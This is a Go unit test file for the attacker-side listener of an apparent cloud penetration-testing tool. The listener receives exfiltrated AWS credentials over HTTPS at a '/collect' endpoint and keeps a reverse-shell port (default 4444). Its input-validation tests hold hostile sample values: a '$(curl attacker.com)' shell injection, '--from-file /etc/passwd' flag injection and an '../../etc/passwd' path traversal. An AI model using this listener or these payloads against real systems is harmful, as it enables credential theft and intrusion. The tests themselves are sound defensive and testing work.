package unit

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"pathrunner/pkg/attacker"
	"pathrunner/pkg/core/repl"
	"strings"
	"testing"
	"time"
)

// --- Cert generation tests ---

func TestGenerateSelfSignedCert(t *testing.T) {
	cert, err := attacker.GenerateSelfSignedCert("203.0.113.5")
	if err != nil {
		t.Fatalf("Expected cert generation to succeed, got: %v", err)
	}

	if len(cert.Certificate) == 0 {
		t.Fatal("Expected certificate to have at least one cert block")
	}

	if cert.PrivateKey == nil {
		t.Fatal("Expected private key to be set")
	}
}

func TestGenerateSelfSignedCertEmptyIP(t *testing.T) {
	cert, err := attacker.GenerateSelfSignedCert("")
	if err != nil {
		t.Fatalf("Expected cert generation with empty IP to succeed, got: %v", err)
	}

	if len(cert.Certificate) == 0 {
		t.Fatal("Expected certificate to have at least one cert block")
	}
}

// --- Credential parsing tests ---

func TestCredentialsHandlerGlueFormat(t *testing.T) {
	var received attacker.ReceivedCredentials
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		received = creds
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	body := `{"credentials":{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","session_token":"FwoGZXIvYXdzEBAaDNYX3456789012345678"}}`
	resp := postJSON(t, url, body)
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("Expected 200, got %d", resp.StatusCode)
	}

	// Give callback time to fire
	time.Sleep(100 * time.Millisecond)

	if received.AccessKeyID != "AKIAIOSFODNN7EXAMPLE" {
		t.Errorf("Expected access key AKIAIOSFODNN7EXAMPLE, got %s", received.AccessKeyID)
	}
	if received.SecretAccessKey != "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" {
		t.Errorf("Expected secret key, got %s", received.SecretAccessKey)
	}
	if received.SessionToken != "FwoGZXIvYXdzEBAaDNYX3456789012345678" {
		t.Errorf("Expected session token, got %s", received.SessionToken)
	}
}

func TestCredentialsHandlerLambdaFormat(t *testing.T) {
	var received attacker.ReceivedCredentials
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		received = creds
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	body := `{"credentials":{"access_key":"AKIALAMBDA7EXAMPLE1","secret_key":"LambdaSecretKeyExample12345678901","token":"FwoGZXIvYXdzLambdaToken123456789"}}`
	resp := postJSON(t, url, body)
	defer resp.Body.Close()

	time.Sleep(100 * time.Millisecond)

	if received.AccessKeyID != "AKIALAMBDA7EXAMPLE1" {
		t.Errorf("Expected access key AKIALAMBDA7EXAMPLE1, got %s", received.AccessKeyID)
	}
	if received.SecretAccessKey != "LambdaSecretKeyExample12345678901" {
		t.Errorf("Expected secret key, got %s", received.SecretAccessKey)
	}
}

func TestCredentialsHandlerEC2Format(t *testing.T) {
	var received attacker.ReceivedCredentials
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		received = creds
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	body := `{"Credentials":{"AccessKeyId":"ASIAEC2TEST12345678","SecretAccessKey":"EC2SecretKeyExampleValue1234567890","Token":"FwoGZXIvYXdzEC2TokenExample12345"}}`
	resp := postJSON(t, url, body)
	defer resp.Body.Close()

	time.Sleep(100 * time.Millisecond)

	if received.AccessKeyID != "ASIAEC2TEST12345678" {
		t.Errorf("Expected access key ASIAEC2TEST12345678, got %s", received.AccessKeyID)
	}
}

func TestCredentialsHandlerFlatFormat(t *testing.T) {
	var received attacker.ReceivedCredentials
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		received = creds
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	body := `{"access_key_id":"AKIAFLAT1234567890AB","secret_access_key":"FlatSecretKeyExampleValue12345678","arn":"arn:aws:iam::123456789012:role/TestRole"}`
	resp := postJSON(t, url, body)
	defer resp.Body.Close()

	time.Sleep(100 * time.Millisecond)

	if received.AccessKeyID != "AKIAFLAT1234567890AB" {
		t.Errorf("Expected access key AKIAFLAT1234567890AB, got %s", received.AccessKeyID)
	}
	if received.ARN != "arn:aws:iam::123456789012:role/TestRole" {
		t.Errorf("Expected ARN, got %s", received.ARN)
	}
}

func TestCredentialsHandlerMissingFields(t *testing.T) {
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		t.Error("Should not have received credentials for invalid request")
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	// Missing secret key
	body := `{"access_key_id":"AKIATEST12345678"}`
	resp := postJSON(t, url, body)
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("Expected 400 for missing fields, got %d", resp.StatusCode)
	}
}

func TestCredentialsHandlerRejectsFlagInjection(t *testing.T) {
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		t.Error("Should not have received credentials with injected flags")
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	// Access key containing flag-like value
	body := `{"access_key_id":"--from-file","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}`
	resp := postJSON(t, url, body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("Expected 400 for flag injection in access key, got %d", resp.StatusCode)
	}

	// Region containing injected value
	body = `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","region":"--from-file /etc/passwd"}`
	resp = postJSON(t, url, body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("Expected 400 for flag injection in region, got %d", resp.StatusCode)
	}

	// Secret key with shell injection attempt
	body = `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"$(curl attacker.com)"}`
	resp = postJSON(t, url, body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("Expected 400 for shell injection in secret key, got %d", resp.StatusCode)
	}
}

func TestCredentialsHandlerRejectsInvalidARN(t *testing.T) {
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		t.Error("Should not have received credentials with invalid ARN")
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	// Path traversal in ARN
	body := `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","arn":"../../etc/passwd"}`
	resp := postJSON(t, url, body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("Expected 400 for path traversal in ARN, got %d", resp.StatusCode)
	}
}

func TestCredentialsHandlerInvalidJSON(t *testing.T) {
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		t.Error("Should not have received credentials for invalid JSON")
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	resp := postJSON(t, url, "not json at all")
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("Expected 400 for invalid JSON, got %d", resp.StatusCode)
	}
}

func TestCredentialsHandlerWrongMethod(t *testing.T) {
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		t.Error("Should not have received credentials for GET request")
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Get(url)
	if err != nil {
		t.Fatalf("GET request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("Expected 405 for GET, got %d", resp.StatusCode)
	}
}

func TestHealthEndpoint(t *testing.T) {
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/health", config.HTTPSPort)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Get(url)
	if err != nil {
		t.Fatalf("Health check failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("Expected 200, got %d", resp.StatusCode)
	}

	body, _ := io.ReadAll(resp.Body)
	var result map[string]string
	json.Unmarshal(body, &result)
	if result["status"] != "ok" {
		t.Errorf("Expected status ok, got %s", result["status"])
	}
}

// --- Listener lifecycle tests ---

func TestListenerStartStop(t *testing.T) {
	config := attacker.DefaultListenerConfig()
	config.HTTPSPort = findFreePort(t)
	config.ShellPort = findFreePort(t)
	config.PublicIP = "127.0.0.1"

	listener := attacker.NewUnifiedListener(config)

	if listener.IsRunning() {
		t.Fatal("Listener should not be running before Start()")
	}

	if err := listener.Start(); err != nil {
		t.Fatalf("Start failed: %v", err)
	}

	if !listener.IsRunning() {
		t.Fatal("Listener should be running after Start()")
	}

	// Verify stats are zeroed
	stats := listener.GetStats()
	if stats.CredsReceived != 0 || stats.ShellSessions != 0 {
		t.Errorf("Expected zeroed stats, got %+v", stats)
	}

	// Stop
	if err := listener.Stop(); err != nil {
		t.Fatalf("Stop failed: %v", err)
	}

	if listener.IsRunning() {
		t.Fatal("Listener should not be running after Stop()")
	}
}

func TestListenerDoubleStart(t *testing.T) {
	config := attacker.DefaultListenerConfig()
	config.HTTPSPort = findFreePort(t)
	config.ShellPort = findFreePort(t)
	config.PublicIP = "127.0.0.1"

	listener := attacker.NewUnifiedListener(config)
	defer listener.Stop()

	if err := listener.Start(); err != nil {
		t.Fatalf("First start failed: %v", err)
	}

	err := listener.Start()
	if err == nil {
		t.Fatal("Expected error on double start")
	}
	if !strings.Contains(err.Error(), "already running") {
		t.Errorf("Expected 'already running' error, got: %v", err)
	}
}

func TestListenerStopWhenNotRunning(t *testing.T) {
	config := attacker.DefaultListenerConfig()
	listener := attacker.NewUnifiedListener(config)

	// Should not error
	if err := listener.Stop(); err != nil {
		t.Fatalf("Stop on non-running listener should not error, got: %v", err)
	}
}

func TestListenerCredsStats(t *testing.T) {
	var received int
	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
		received++
	})
	defer listener.Stop()

	config := listener.GetConfig()
	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)

	body := `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}`
	resp1 := postJSON(t, url, body)
	resp1.Body.Close()
	resp2 := postJSON(t, url, body)
	resp2.Body.Close()

	time.Sleep(200 * time.Millisecond)

	stats := listener.GetStats()
	if stats.CredsReceived != 2 {
		t.Errorf("Expected 2 creds received, got %d", stats.CredsReceived)
	}
	if received != 2 {
		t.Errorf("Expected callback fired 2 times, got %d", received)
	}
}

func TestDefaultListenerConfig(t *testing.T) {
	config := attacker.DefaultListenerConfig()

	if config.HTTPSPort != 8443 {
		t.Errorf("Expected default HTTPS port 8443, got %d", config.HTTPSPort)
	}
	if config.ShellPort != 4444 {
		t.Errorf("Expected default shell port 4444, got %d", config.ShellPort)
	}
	if config.BindAddr != "0.0.0.0" {
		t.Errorf("Expected default bind addr 0.0.0.0, got %s", config.BindAddr)
	}
}

// --- REPL command tests ---

func TestAttackerListenerHelp(t *testing.T) {
	identityManager := &MockIdentityManager{}
	sessionManager := &MockSessionManager{}
	r := repl.NewREPL(identityManager, sessionManager)

	err := r.ExecuteCommand("attacker listener help")
	if err != nil {
		t.Errorf("Expected listener help to succeed, got: %v", err)
	}
}

func TestAttackerListenerStatusNotRunning(t *testing.T) {
	identityManager := &MockIdentityManager{}
	sessionManager := &MockSessionManager{}
	r := repl.NewREPL(identityManager, sessionManager)

	err := r.ExecuteCommand("attacker listener status")
	if err != nil {
		t.Errorf("Expected listener status to succeed when not running, got: %v", err)
	}
}

func TestAttackerListenerStopNotRunning(t *testing.T) {
	identityManager := &MockIdentityManager{}
	sessionManager := &MockSessionManager{}
	r := repl.NewREPL(identityManager, sessionManager)

	err := r.ExecuteCommand("attacker listener stop")
	if err != nil {
		t.Errorf("Expected listener stop to succeed when not running, got: %v", err)
	}
}

func TestAttackerListenerUnknownSubcommand(t *testing.T) {
	identityManager := &MockIdentityManager{}
	sessionManager := &MockSessionManager{}
	r := repl.NewREPL(identityManager, sessionManager)

	err := r.ExecuteCommand("attacker listener bogus")
	if err == nil {
		t.Error("Expected error for unknown listener subcommand")
	}
}

func TestAttackerListenerDefault(t *testing.T) {
	identityManager := &MockIdentityManager{}
	sessionManager := &MockSessionManager{}
	r := repl.NewREPL(identityManager, sessionManager)

	// Running 'attacker listener' with no subcommand shows help
	err := r.ExecuteCommand("attacker listener")
	if err != nil {
		t.Errorf("Expected listener (default help) to succeed, got: %v", err)
	}
}

func TestAttackerListenerStartHelp(t *testing.T) {
	identityManager := &MockIdentityManager{}
	sessionManager := &MockSessionManager{}
	r := repl.NewREPL(identityManager, sessionManager)

	err := r.ExecuteCommand("attacker listener start help")
	if err != nil {
		t.Errorf("Expected listener start help to succeed, got: %v", err)
	}
}

// --- Helpers ---

func setupTestListener(t *testing.T, onCreds func(attacker.ReceivedCredentials)) *attacker.UnifiedListener {
	t.Helper()

	config := attacker.DefaultListenerConfig()
	config.HTTPSPort = findFreePort(t)
	config.ShellPort = findFreePort(t)
	config.PublicIP = "127.0.0.1"

	listener := attacker.NewUnifiedListener(config)
	listener.OnCredReceived = onCreds

	if err := listener.Start(); err != nil {
		t.Fatalf("Failed to start test listener: %v", err)
	}

	// Give listener time to bind
	time.Sleep(50 * time.Millisecond)

	return listener
}

func postJSON(t *testing.T, url string, body string) *http.Response {
	t.Helper()

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 5 * time.Second,
	}

	resp, err := client.Post(url, "application/json", strings.NewReader(body))
	if err != nil {
		t.Fatalf("POST to %s failed: %v", url, err)
	}
	return resp
}

func findFreePort(t *testing.T) int {
	t.Helper()

	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("Failed to find free port: %v", err)
	}
	port := l.Addr().(*net.TCPAddr).Port
	l.Close()
	return port
}
